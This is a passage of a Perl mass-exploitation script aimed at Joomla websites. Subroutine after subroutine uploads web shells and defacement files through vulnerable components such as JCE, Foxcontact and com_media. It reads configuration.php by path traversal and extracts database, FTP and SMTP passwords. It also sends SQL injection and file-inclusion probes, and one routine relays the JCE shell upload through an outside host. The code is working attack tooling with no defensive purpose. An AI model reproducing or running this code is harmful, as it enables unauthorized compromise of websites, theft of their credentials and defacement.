my $body = $ua->post( $izo,
        Content_Type => 'multipart/form-data',
        Content => $indexa
        );
$foxups="$site/components/com_foxcontact/Kadd3chy.php";
}		
my $checkfoxup = $ua->get("$foxups")->content;
if ($checkfoxup =~ /Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact2";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold green'),"[Link] => $foxups\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$foxups\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact2";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}
}
}
}

############### Jce Img   ####################

sub comjce(){

$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"JCE Image Upload .................. ";


if ($res =~ m/No function call specified!/i){
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["Kadd3chy.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
    print color('bold red');
print "Not Vulnerable\n ";
    print color('reset');


}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/Kadd3chy.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
    open(save, '>>Result/Index.txt');
    print save "[Don3 JCE] $def\n";
    close(save);
    print color('bold green');
	print "[Success]\n";
    print color('reset');
zoneh();



}

}
else{
    print color('bold red');
print  "Not Vulnerable\n";
    print color('reset');

}
    }

################ comweblink #####################
sub comweblinks(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
$urlone ="$site/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=";
$token = $ua->get($urlone)->content;
if($token =~/<form action="(.*?)" id="uploadForm"/)
{
$url=$1;
}

my $index ="Kadd3chy.gif";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$weblinksup= "$site/images/Kadd3chy.gif";
$check = $ua->get($weblinksup)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold white')," Exploiting ..... ";
print color('bold green'),"Vulnerable\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Done Picture Uploaded\n";
print color('bold white'),"  [Link] => $weblinksup\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$weblinksup\n";
close (TEXT);
$def = $weblinksup;
zoneh();
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold white')," Exploiting ..... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ jce shell ###################

sub jceshell(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Jce Upload Shell] Exploiting .. ";


$drupalink = "http://misterspybot.com/jce.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/success/) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>Result/Shells.txt');
    print save "$site/images/stories/Kadd3chy.php\n";
    close(save);
    }
else{
    print color('bold red');
print  "Not Vulnerable\n";
    print color('reset');


        }

}


############### ADS Manger ###################

sub comadsmanegr(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"[Com Ads Manger ] Exploiting ... ";

my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["Kadd3chydef.jpg"], name => "Don3.html"]);
if ($exploit->decoded_content =~ /Don3.html/) {
        open(save, '>>Result/Index.txt');    
    print save "[ads] $site\n";   
    close(save);

    $def="$site/tmp/plupload/Don3.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Kadd3chy/) {
    print "[Success]\n ";

    zoneh();
    }
}else{
    print color('bold red');
print "Not Vulnerable\n\n";
    print color('reset');

;
}
}



####################################################################################################
####################################################################################################
######################################COM hdflvplayer##############################################
####################################################################################################
####################################################################################################
   sub hdflvplayer(){

# // here for download config but i have to add download cpanel information :p  //
$conflink = "$site/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com hdflvplayer";
print color('bold white')," Exploiting .. ";
print color('reset');
print color('bold green');
print "Vulnerable";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/Try_Manuall.txt');   
    print save "[hdflv] $site\n";   
    close(save);
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n\n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}

}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com hdflvplayer";
print color('bold white')," Exploiting .. ";
print color('reset');
print color('bold red');
print "Not Vulnerable";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}

################ Com Media #####################
sub comedia(){
my $url = "$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
my $index ="Kadd3chy.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$mediaup="$site/images/Kadd3chy.txt";
$checkpofwup = $ua->get("$mediaup")->content;
if($checkpofwup =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Media";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done File Uploaded\n";
print color('bold white'),"  Shell Link => $mediaup\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$mediaup\n";
close (TEXT);
$def = $mediaup;
zoneh();
}else{

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Media";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

############################################################
sub com_content(){ 
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
             
print color('bold white'),"Com content Exploiting ...... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_user&view=reset&layout=confirm";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_search(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com search Exploiting ....... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_search&Itemid=1&searchword=%22%3Becho%20md5(911)%3B";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_admin1(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com admin1 Exploiting ....... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.admin.html.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_admin2(){              print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com admin2 Exploiting ....... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.admin.html.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content1(){       print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com content1 Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content2(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com content2 Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_weblinks(){              print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com weblinks Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_weblinks&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_mailto(){              print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com mailto Exploiting ....... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_mailto&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content3(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com content3 Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=article&id=[A VALID ID]&Itemid=[A VALID ID]&sflaction=dir&sflDir=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content4(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com content4 Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=article&id=[A VALID ID]&Itemid=[A VALID ID]&sflaction=dir&sflDir=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	

sub com_users(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com users Exploiting ........ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_users&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_installer(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com installer Exploiting .... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_installer&view=archive";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_search1(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com search1 Exploiting ...... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_search&Itemid=1&searchword=%22%3Becho%20md5(911)%3B";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_poll(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com poll Exploiting ......... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_poll&task=results&id=14&mosmsg=DOS@HERE<<>AAA<><>";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_banners(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com banners Exploiting ...... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_banners&task=archivesection&id=0'+and+'1'='1::/index.php?option=com_banners&task=archivesection&id=0'+and+'1'='2";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_mailto1(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com mailto1 Exploiting ...... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/index.php?option=com_mailto&tmpl=mailto&article=550513+and+1=2+union+select+concat(username,char(58),password)+from+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--&Itemid=1";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_a6mambocredits(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com a6mambocredits ................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.a6mambocredits.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_a6mambohelpdesk(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com a6mambohelpdesk ............... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.a6mambohelpdesk.php?mosConfig_live_site=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_advancedpoll(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com advancedpoll .................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.advancedpoll.php?mosConfig_live_site=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_akocomment(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com akocomment Exploiting ... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/admin.Akocomment.php?mosConfig_live_site=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_articles(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com articles Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/com_articles.php?absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_artlinks(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com artlinks Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/artlinks.dispnew.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_trade(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com trade Exploiting ........ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/lang.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_bayesiannaivefilter(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com bayesiannaivefilter ........... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/lang.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_babackup(){           print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
   print color('bold white'),"com babackup Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
